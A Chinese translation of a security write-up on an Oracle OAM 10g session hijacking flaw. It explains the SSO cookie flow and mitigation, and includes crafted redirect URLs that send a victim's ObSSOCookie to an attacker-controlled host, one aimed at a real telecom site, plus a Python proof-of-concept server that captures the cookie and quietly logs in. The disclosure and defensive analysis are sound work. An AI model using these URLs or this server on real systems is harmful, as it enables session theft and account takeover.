> 原文链接: https://www.anquanke.com//post/id/86481 


# 【漏洞分析】针对Oracle OAM 10g 会话劫持漏洞分析


                                阅读量   
                                **131862**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：krbtgt.pw
                                <br>原文地址：[https://krbtgt.pw/oracle-oam-10g-session-hijacking/](https://krbtgt.pw/oracle-oam-10g-session-hijacking/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p2.ssl.qhimg.com/t016f0f69b6f1d09f4f.jpg)](https://p2.ssl.qhimg.com/t016f0f69b6f1d09f4f.jpg)**

> 严正声明：本文仅限于技术讨论与学术学习研究之用，严禁用于其他用途（特别是非法用途，比如非授权攻击之类），否则自行承担后果，一切与作者和平台无关，如有发现不妥之处，请及时联系作者和平台



译者：[ForrestX386](http://bobao.360.cn/member/contribute?uid=2839753620)

预估稿费：180RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

** **

**0x00. 引言**

Oracle OAM (Oracle Access Manager) 是Oracle公司出品的SSO解决方案。最近有国外研究者爆出，在Oracle OAM 10g中，错误地配置OAM会导致远程会话劫持（然而大部分企业都没有正确的配置，可见此漏洞影响还是蛮大的），下文是此漏洞的详情介绍。



**0x01. Oracle OAM 认证流程分析**



去年，Tom 和我 参与了一个事后证明还是蛮有挑战的安全评估项目，在这个项目中，我们遇到一个非常复杂的单点登录认证模型，在单点登录过程中，足足要经过18个不同的http请求才能访问到请求的资源。

我们仔细地梳理了单点登录请求中每一个请求中的cookie和相应参数，我们在这一系列cookie中发现有一个名为ObSSOCookie的cookie是最为重要的，在网上进行一番查找之后，ObSSOCookie这个cookie和Oracle Access Manager 产品有关,它是决定认证是否通过的关键指标。

首先我们需要搞明白OAM SSO认证的流程

[![](https://p4.ssl.qhimg.com/t013139d4768e646a0c.jpg)](https://p4.ssl.qhimg.com/t013139d4768e646a0c.jpg)

图0

正如上图所示，假如用户访问一个受保护的资源，比如:[https://somewebsite.com/protected](https://somewebsite.com/protected)

OAM首先会检查一下请求的资源是否为受保护域的资源 (对照上图的step1 和 step2)，如果是，则重定向用户请求至OAM登录页面

图1至图4演示了，用户访问受保护资源域的文件到被OAM重定向至授权登录页面的过程

[![](https://p3.ssl.qhimg.com/t016ef3a7ce027a5fb7.png)](https://p3.ssl.qhimg.com/t016ef3a7ce027a5fb7.png)<br>
图1

somewebsite.com 是受保护的域名，需要进行授权认证才能获取其上资源

[![](https://p3.ssl.qhimg.com/t016f705789db2d980a.png)](https://p3.ssl.qhimg.com/t016f705789db2d980a.png)<br>
图2

如果没有认证，somewebsite.com 会响应302，并在响应报文中植入名为ObSSOCookie的cookie，这个是cookie是somewebsite.com判断用户是否认证OK的依据。

[![](https://p2.ssl.qhimg.com/t01848915e7d6eda1d3.png)](https://p2.ssl.qhimg.com/t01848915e7d6eda1d3.png)

图3

wh参数表示请求资源的站点，告诉OAM哪一个资源域正在接受认证。

[![](https://p4.ssl.qhimg.com/t01ed0563269db3f37b.png)](https://p4.ssl.qhimg.com/t01ed0563269db3f37b.png)

图4

OAM会在响应报文中植入名为OAMREQ的cookie，这个cookie中包含了用户正在进行认证的资源域名([https://somewebsite.com](https://somewebsite.com) ).

接下来就是OAM授权登录页面（有可能包含双因子认证），下图是登录认证的流程

[![](https://p2.ssl.qhimg.com/t0170bcc8d28a5ebd8f.jpg)](https://p2.ssl.qhimg.com/t0170bcc8d28a5ebd8f.jpg)

图5

[![](https://p1.ssl.qhimg.com/t01a5c74eb4861a5973.jpg)](https://p1.ssl.qhimg.com/t01a5c74eb4861a5973.jpg)<br>
图6

正如图5和图6所示，用户提交登陆凭据至OAM，OAM 检查登录凭据是否正确，如果认证通过，则返回登录成功302响应报文，将用户请求重定向至原先站点，重定向的URL中包含了资源访问的授权码（一次性key）,客户端再次访问源站的时候携带了这个访问授权码以便源站鉴权所用，源站鉴权通过之后，会在响应报文中重新生成ObSSOCookie的值，这个值就是访问源站的凭据，后续再次访问源站资源的时候，携带这个cookie就可以直接通过认证

[![](https://p4.ssl.qhimg.com/t01cd1f7edf2d89b1d8.png)](https://p4.ssl.qhimg.com/t01cd1f7edf2d89b1d8.png)

图7



[![](https://p5.ssl.qhimg.com/t015898c3fe30c93fb6.png)](https://p5.ssl.qhimg.com/t015898c3fe30c93fb6.png)<br>
图8

OAM认证ok之后会响应302，将请求重定向至受保护资源域（somewebsite.com），并在重定向url中携带认证成功的标记（就是cookie）

[![](https://p1.ssl.qhimg.com/t01752058c03956f32a.png)](https://p1.ssl.qhimg.com/t01752058c03956f32a.png)

图9

客户端携带OAM授予的认证通过的凭据向受保护资源域（somewebsite.com） 发起请求

[![](https://p3.ssl.qhimg.com/t01adb1d69c29d857e3.png)](https://p3.ssl.qhimg.com/t01adb1d69c29d857e3.png)<br>
图10

受保护资源域（somewebsite.com）通过了客户端请求，并在响应的302报文中修改ObSSOCookie的值，标记其认证通过

[![](https://p1.ssl.qhimg.com/t016cbcd22fd3998498.png)](https://p1.ssl.qhimg.com/t016cbcd22fd3998498.png)

图11

接下来，客户端的请求都被允许

[![](https://p1.ssl.qhimg.com/t01c4b9d12ad9186326.png)](https://p1.ssl.qhimg.com/t01c4b9d12ad9186326.png)<br>
图12



**0x02. OAM 会话劫持过程分析**

从 0x01中关于Oracle OAM 认证流程的分析中，也许你已经发现了认证流程中可能会出问题的地方，如下：

1) rh 参数表示受保护资源的域名

2)  OAM授予的含有认证关键信息的cookie是通过GET 方式传递

接下来，我们要做的事就是去偷取OAM认证流程中的关键cookie，然后实现会话劫持

我们查询Oracle OAM 的相关文档后发现，当我们去请求一个受保护域名不存在的文件时候，OAM也有会要求我们进行认证。

[![](https://p2.ssl.qhimg.com/t01b89132d892aa92b7.png)](https://p2.ssl.qhimg.com/t01b89132d892aa92b7.png)

比如说http://localhost是受保护的域名，资源/this/does/not/exist.html是不存在的，但是OAM还是会要求我们进行认证。<br>
虽然OAM 会对受保护域不存在的资源进行认证，我们还是怀疑，如果通过访问不存在的资源，然后获取OAM授予的合法cookie，再然后用这个cookie去访问实际存在的资源，会不会不可用

[![](https://p0.ssl.qhimg.com/t011539463e96bf7335.jpg)](https://p0.ssl.qhimg.com/t011539463e96bf7335.jpg)

但是不论怎样，我们还是进行了尝试，我们通过了OAM的认证，假设OAM给我们的重定向URL是这样的：

```
http://localhost/obrar.cgi?cookie=&lt;LOOOOOOONG_COOKIE_VALUE&gt;
```

然后我们将localhost更改为其他需要认证的域名，如下：

```
http://&lt;valid_domain_of_proteced_resource&gt;/obrar.cgi?cookie=&lt;LOOOOOOONG_COOKIE_VALUE&gt;
```

我们访问一下，结果竟然可以获取这个受保护域的资源。

[![](https://p0.ssl.qhimg.com/t01506df3f621effde9.png)](https://p0.ssl.qhimg.com/t01506df3f621effde9.png)<br>[![](https://p3.ssl.qhimg.com/t01af63858199da4095.gif)](https://p3.ssl.qhimg.com/t01af63858199da4095.gif)

好了，到这里我们已经发现了2处漏洞：

1）开放重定向 （如上面图2所示，wh可以自行修改）

2）含有关键信息的cookie是通过GET方式传递

这样我们就可以给用户发送钓鱼连接，

```
http://someotherdomain.com/oam/server/obrareq.cgi?wh=somewebsite.com wu=/protected/ wo=1 rh=https://somewebsite.com ru=/protected/
```

比如将wh修改为攻击者所控制的域名，这样攻击者就能获取用户在OAM登录成功之后所获取的登录凭据cookie，有了OAM授予的登录凭据cookie，攻击者就可以访问受保护域的资源



**扩大成果**

起初，我们认为这个漏洞只是个例，后来调查发现，我们实在是大错特错，有很多组织都存在类似这种漏洞，其中不乏一些大公司。我们开始寻找那些使用OAM 作为SSO解决方案并且有漏洞奖励计划的公司，很快，我们就发现了一家德国电信公司的站点(https://my.telekom.ro )存在此类漏洞。如果用户直接访问https://my.telekom.ro ，将会被重定向至

```
https://my.telekom.ro/oam/server/obrareq.cgi?wh=IAMSuiteAgent wu=/ms_oauth/oauth2/ui/oauthservice/showconsent wo=GET rh=https://my.telekom.ro:443/ms_oauth/oauth2/ui/oauthservice ru=/ms_oauth/oauth2/ui/oauthservice/showconsent rq=response_type=code&amp;client_id=98443c86e4cb4f9898de3f3820f8ee3c&amp;redirect_uri=http://antenaplay.ro/tkr&amp;scope=UserProfileAntenaPlay.me&amp;oracle_client_name=AntenaPlay
```

如果点击上面那个链接，又会被重定向至

```
https://my.telekom.ro/ssologin/ssologin.jsp?contextType=external&amp;username=string&amp;OverrideRetryLimit=0&amp;contextValue=/oam&amp;password=sercure_string&amp;challenge_url=https://my.telekom.ro/ssologin/ssologin.jsp&amp;request_id=-9056979784527554593&amp;authn_try_count=0&amp;locale=nl_NL&amp;resource_url=https://my.telekom.ro:443/ms_oauth/oauth2/ui/oauthservice/showconsent?response_type=code&amp;client_id=98443c86e4cb4f9898de3f3820f8ee3c&amp;redirect_uri=http://antenaplay.ro/tkr&amp;scope=UserProfileAntenaPlay.me&amp;oracle_client_name=AntenaPlay
```

用户必须登录授权之后，才能获取访问资源的权限。如果攻击者将 URL1中的rh修改为攻击者控制的恶意站点，如下：

```
https://my.telekom.ro/oam/server/obrareq.cgi?wh=IAMSuiteAgent wu=/msoauth/oauth2/ui/oauthservice/showconsent wo=GET rh=http://our_malicious_domain/msoauth/oauth2/ui/oauthservice ru=/msoauth/oauth2/ui/oauthservice/showconsent rq=responsetype=code&amp;clientid=98443c86e4cb4f9898de3f3820f8ee3c&amp;redirecturi=http://antenaplay.ro/tkr&amp;scope=UserProfileAntenaPlay.me&amp;oracleclientname=AntenaPlay
```

我们假装成受害者，点击了URL3，然后页面会调转到OAM登录页面，登录成功之后，会将OAM的授权信息发给攻击者控制的站点http://our_malicious_domain。然后http://our_malicious_domain 就会偷取合法用户登录的凭据，然后再将rh修改为原来的值（https://https://my.telekom.ro:443），然后再重定向给用户，这期间，用户一点察觉都没有



**0x03. OAM 会话劫持PoC及演示**

PoC：



```
#!/usr/bin/env python
    """
    Oracle OAM 10g Session Hijack
    
    usage: Oracle_PoC.py -d redirect_domain
    
    Default browser will be used to open browser tabs
    
    PoC tested on Windows 10 x64 using Internet Explorer 11
    
    positional arguments:
    
    """
    import SimpleHTTPServer  
    import SocketServer  
    import sys  
    import argparse  
    import webbrowser  
    import time
    
    def redirect_handler_factory(domain):  
        class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
           def do_GET(self):
                if self.path.endswith("httponly") or self.path.endswith("%252F") or  self.path.endswith("do") or self.path.endswith("adfAuthentication"):
                    webbrowser.open_new("https://" + domain) #Load website in order to retrieve any other cookies needed to login properly
                    time.sleep( 5 )
                    webbrowser.open("https://"+ domain +"/" + self.path, new=0, autoraise=True) #Use received cookie to login on to the website
                    time.sleep( 5 )
                    self.send_response(301)
                    self.send_header('Location','https://'+ domain +'/'+ self.path) #Send same cookie to the victim and let him log-in as well, to not raise any suspicion ;)
                    self.end_headers()
                    return
                else:
                                print self.path
        return RedirectHandler
    
    
    def main():
    
        parser = argparse.ArgumentParser(description='Oracle Webgate 10g Session Hijacker')
    
        parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
        parser.add_argument('--ip', '-i', action="store", default="0.0.0.0", help='host interface to listen on')
        parser.add_argument('--domain','-d', action="store", default="localhost", help='domain to redirect the victim to')
    
        myargs = parser.parse_args()
    
        port = myargs.port
        host = myargs.ip
        domain = myargs.domain
    
        redirectHandler = redirect_handler_factory(domain)
    
        handler = SocketServer.TCPServer((host, port), redirectHandler)
        print("serving at port %s" % port)
        handler.serve_forever()
    
    if __name__ == "__main__":  
        main()
```



**0x04. 如何减轻此漏洞带来的损害**

我们就此漏洞已经联系了Oracle，他们简单地认为这是配置导致的问题，他们的回如下：

[![](https://p1.ssl.qhimg.com/t017d6a6244115dd278.png)](https://p1.ssl.qhimg.com/t017d6a6244115dd278.png)

如果没有为OAM配置SSODomains，那么所有的域名都可以使用认证之后的获取的cookie，所以为OAM 配置合法的域名范围，可以大大缓解此漏洞的危害。



**0x05. CVSS 评分**

根据评分依据，这个漏洞的得分是：9.3

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0168fea0318eaa6735.png)
